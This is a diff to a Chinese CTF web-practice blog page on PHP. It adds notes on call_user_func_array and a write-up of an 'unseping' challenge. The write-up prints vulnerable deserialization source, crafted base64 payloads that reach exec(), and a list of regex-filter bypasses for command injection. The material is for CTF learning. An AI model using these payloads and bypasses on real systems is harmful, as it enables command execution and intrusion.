@@ -8,14 +8,6 @@ categories:
 ---
 # ctf-web练习(php)--待补充
 
-## 代码审计基础知识
-
-代码检查是审计工作中最常用的技术手段，实际应用中，采用“自动分析+人工验证”的方式进行。通常检查项目包括:系统所用开源框架、源代码设计、错误处理不当、直接对象引用、资源滥用、API滥用、后门代码发现等，通常能够识别如下代码中的风险点：
-
-跨站脚本漏洞、跨站请求伪装漏洞、SQL注入漏洞、命令执行漏洞、日志伪造漏洞、参数篡改、密码明文存储、配置文件缺陷、路径操作错误、资源管理、不安全的Ajax调用、系统信息泄露、调试程序残留、第三方控件漏洞、文件上传漏洞、远程命令执行、远程代码执行、越权下载、授权绕过漏洞。
-
-![image-20230914165928110](https://s2.loli.net/2023/09/14/gY5Goj1kVz3eQ9b.png)
-
 ## php知识
 
 ### php的魔术方法
@@ -92,9 +84,40 @@ echo serialize($a);
 
 ```
 
-学习链接：
+### call_user_func_array函数
 
-https://zhuanlan.zhihu.com/p/601673949
+（1）普通使用：
+
+```php
+function a($b, $c) 
+{  
+echo $b; 
+echo $c; 
+} 
+call_user_func_array('a', array("111", "222")); 
+//输出 111 222
+```
+
+ 
+
+
+（2）调用类内部的方法：
+
+```php
+Class ClassA 
+{ 
+function bc($b, $c)
+{ 
+$bc = $b + $c; 
+echo $bc; 
+} 
+} 
+
+call_user_func_array(array('ClassA','bc'), array("111", "222")); 
+//输出  333 
+```
+
+参考链接：https://blog.csdn.net/weihuiblog/article/details/78998924
 
 ## 题目
 
@@ -161,9 +184,133 @@ class Demo {
 
 $file 是私有成员序列化之后字符串首尾会多出两个空格 “%00*%00”，所以base64加密最好在代码中执行防止复制漏掉----本人刚开始的解题思路便是启动服务器输出序列化后的字符串然后进行复制，再在代码中进入下一步操作，然后出现了问题。
 
-#### 参考链接
+### 4.unseping
+
+源码：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class ease{
+  
+  private $method;
+  private $args;
+  function __construct($method, $args) {
+    $this->method = $method;
+    $this->args = $args;
+  }
+ 
+  function __destruct(){
+    if (in_array($this->method, array("ping"))) {
+      call_user_func_array(array($this, $this->method), $this->args);
+    }
+  } 
+ 
+  function ping($ip){
+    exec($ip, $result);
+    var_dump($result);
+  }
+
+  function waf($str){
+    if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
+      return $str;
+    } else {
+      echo "don't hack";
+    }
+  }
+ 
+  function __wakeup(){
+    foreach($this->args as $k => $v) {
+      $this->args[$k] = $this->waf($v);
+    }
+  }  
+}
+
+$ctf=@$_POST['ctf'];
+@unserialize(base64_decode($ctf));
+?>
+```
+
+注意项为：传入的args需要为array数组
+
+首先尝试执行未被过滤的命令：
+
+```php
+$a=new ease("ping",array("pwd"));
+echo base64_encode(serialize($a));
+//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJwd2QiO319
+```
+
+采用post方法传参，可以看到成功执行pwd命令。
+
+那么接下来就是替换成其他的命令，且要绕过正则过滤。
+
+该题的构造：
+
+```php
+$a=new ease("ping",array('more${IFS}fl""ag_1s_here$(printf${IFS}"\57")f\lag_831b69012c67b35f.p\hp'));
+echo base64_encode(serialize($a));
+```
+
+稍微记录下一些绕过：
+
+(命令行知识：$()这个符号，可以把括号里面的东西当命令执行,反引号同理。)
+
+- 反斜线\绕过
+
+  ```bash
+  $ l\s
+  ```
+
+- ${IFS},$IFS代替空格
+
+- 拼接法：
+
+  ```bash
+  $ a=fl;b=ag;cat$IFS$a$b
+  ```
+
+- 引号绕过
+
+  ```bash
+  //如cat、ls被过滤
+  $ ca""t /flag
+  $ l's' /
+  ```
+
+- 八进制编码和十六进制编码绕过
+
+  比如：“/“的八进制编码为\57，那么使用$(printf${IFS}”\57”)**内敛执行输出**“/”到字符串中。
+
+  所以该题在应对flag被正则过滤时也可以：（\141是a的八进制编码）
+
+  ```php
+  $a=new ease("ping",array('more${IFS}fl$(printf${IFS}"\141")g_1s_here$(printf${IFS}"\57")f\lag_831b69012c67b35f.p\hp'));
+  echo base64_encode(serialize($a));
+  ```
+
+- cat的替换命令
+
+  | tac  | 与cat相反，按行反向输出                            |
+  | ---- | -------------------------------------------------- |
+  | more | 按页显示，用于文件内容较多且不能滚动屏幕时查看文件 |
+  | less | 与more类似                                         |
+  | tail | 查看文件末几行                                     |
+  | head | 查看文件首几行                                     |
+
+
+
+## 参考链接
+
+php反序列化：
+
+https://zhuanlan.zhihu.com/p/601673949
 
 https://blog.csdn.net/Hardworking666/article/details/122373938
 
 https://www.cnblogs.com/hugboy/p/web_php_unserialize.html
 
+rce绕过:
+
+https://blog.csdn.net/m0_73185293/article/details/131557169
